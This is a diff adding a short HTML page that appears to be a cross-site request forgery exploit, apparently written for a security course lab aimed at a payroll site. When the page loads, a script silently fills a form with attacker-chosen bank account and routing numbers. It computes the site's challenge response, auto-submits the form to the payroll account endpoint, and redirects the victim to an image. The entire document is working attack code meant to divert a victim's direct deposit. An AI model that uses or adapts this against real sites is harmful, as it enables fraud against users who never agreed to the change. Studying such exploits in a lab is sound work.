@@ -1,0 +1,33 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+</head>
+
+<body onload="javascript:changeAccount();">
+
+<form action="http://payroll.utexas.edu/account.php" id="form" method="post">
+    <input type="text" name="account" value="">
+    <input type="text" name="routing" value="">
+    <input type="text" name="challenge" value= "">
+    <input type="text" id = "res" name="response"  >
+    <button class="btn submit" id = "p_button" name="action" value="save"/>
+
+</form>
+
+<script>
+    function changeAccount () {
+        var expe = 1;
+        var acc = "3133731337";
+        var rout = "1000000001";
+        document.getElementsByName("account")[0].value = acc;
+        document.getElementsByName("routing")[0].value = rout;
+        var test = acc + rout;
+        for (var i = 0; i < test.length; i++) {
+            expe = (17237 * expe + test.charCodeAt(i)) % 100000;
+        }
+        document.getElementById("res").value = expe.toString();
+        document.getElementById("p_button").click();
+        window.location='http://i.imgur.com/x0ml8.png';
+    }
+</script>
+</html>
